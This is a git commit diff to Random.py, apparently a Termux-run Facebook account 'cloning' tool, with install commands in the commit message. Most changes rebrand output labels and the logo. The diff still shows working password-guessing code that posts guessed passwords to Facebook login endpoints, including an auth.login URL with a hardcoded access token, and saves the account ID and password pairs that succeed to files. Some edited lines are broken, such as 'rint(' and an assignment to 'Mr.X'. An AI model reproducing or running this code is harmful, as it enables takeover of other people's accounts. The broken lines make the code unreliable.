029892c2245a5ac75ac677752fda109c757d57d6
Sagar Rajbanshi <113610351+SagarRajbanshi@users.noreply.github.com>
2022-11-12 08:19:57 +0545

    Random.py
    pkg update
    pkg upgrade
    pkg install python
    pkg install git
    git clone https://github.com/SagarRajbanshi/Random.git
    cd Random
    python Random.py

--- Random.py
+++ Random.py
@@ -309,7 +309,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ TUTUL ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ Mr.X ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -324,14 +324,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ Tutul-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ Mr.X-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ Tutul-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ Mr.X-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -348,7 +348,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ Tutul ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ Mr.X ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -362,17 +362,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ Tutul-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ Mr.X-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ Tutul-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ Mr.X-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/Tutul-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/Mr.X-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -390,20 +390,25 @@ def follow(ses,coki):
 logo = ("""\033[1;32m
        
 
-████████╗██╗   ██╗████████╗██╗   ██╗██╗     
-╚══██╔══╝██║   ██║╚══██╔══╝██║   ██║██║     
-   ██║   ██║   ██║   ██║   ██║   ██║██║     
-   ██║   ██║   ██║   ██║   ██║   ██║██║     
-   ██║   ╚██████╔╝   ██║   ╚██████╔╝███████╗
-   ╚═╝    ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝
+
+███████╗     █████╗      ██████╗      █████╗     ██████╗ 
+██╔════╝    ██╔══██╗    ██╔════╝     ██╔══██╗    ██╔══██╗
+███████╗    ███████║    ██║  ███╗    ███████║    ██████╔╝
+╚════██║    ██╔══██║    ██║   ██║    ██╔══██║    ██╔══██╗
+███████║    ██║  ██║    ╚██████╔╝    ██║  ██║    ██║  ██║
+╚══════╝    ╚═╝  ╚═╝     ╚═════╝     ╚═╝  ╚═╝    ╚═╝  ╚═╝
+                                                         
+
                                             \033
 __________________×______________________
   
   Auther   :  Sagar Rajbanshi 
  
   Github   :  Sagar Rajbanshi 
+  
+  Instagram: Sagar._.Rajbanshi
 
-  Facebook: Sagar Rajbanshi   (50% Ok Account Open Just Now)❤️
+  Facebook: Sagar Rajbanshi   (70% Ok Account Open Just Now)❤️
 
   WhatsApp: 9827395590
 __________________×______________________\033[1;37m""")
@@ -424,16 +429,16 @@ class Main:
 		print(" [6] 2004-2005 Cloning Paid")
 		print(" [7] 2006-2007 Cloning Paid")
 		print(" [E] Exit Programming\n")
-		TUTUL =input(" Choose : ")
-		if TUTUL in ["1", "01"]:
+		Mr.X =input(" Choose : ")
+		if Mr.X in ["1", "01"]:
 			File()
-		if TUTUL in ["2", "02"]:
+		if Mr.X in ["2", "02"]:
 			Public()
-		if TUTUL in ["3", "03"]:
+		if Mr.X in ["3", "03"]:
 			os.system("python Dump.py")
-		if TUTUL in ["4", "04"]:
+		if Mr.X in ["4", "04"]:
 			self.old()
-		if TUTUL in ["5", "05"]:
+		if Mr.X in ["5", "05"]:
 			self.old2()
 			exit()
 		else:
@@ -836,7 +841,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ Tutul ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ Mr.X ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -853,15 +858,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ Tutul-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Mr.X-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-Tutul-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-Mr.X-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ ANMOL-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-Tutul-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-Mr.X-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1263,7 +1268,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [Tutul ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [Mr.X ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1280,15 +1285,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ Tutul-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Mr.X-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-Tutul-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-Mr.X-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ Tutul-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Mr.X-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-Tutul-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-Mr.X-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
